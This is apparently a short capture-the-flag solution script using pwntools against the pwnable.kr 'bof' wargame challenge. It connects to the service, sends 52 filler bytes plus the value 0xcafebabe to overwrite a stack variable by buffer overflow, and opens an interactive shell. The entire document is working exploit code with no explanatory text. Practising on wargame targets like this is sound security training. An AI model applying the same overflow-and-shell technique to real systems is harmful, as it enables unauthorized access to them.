# coding: utf-8
from pwn import *
p = remote('pwnable.kr',9000)
p.send(52*'A'+p32(0xcafebabe))
p.interactive()
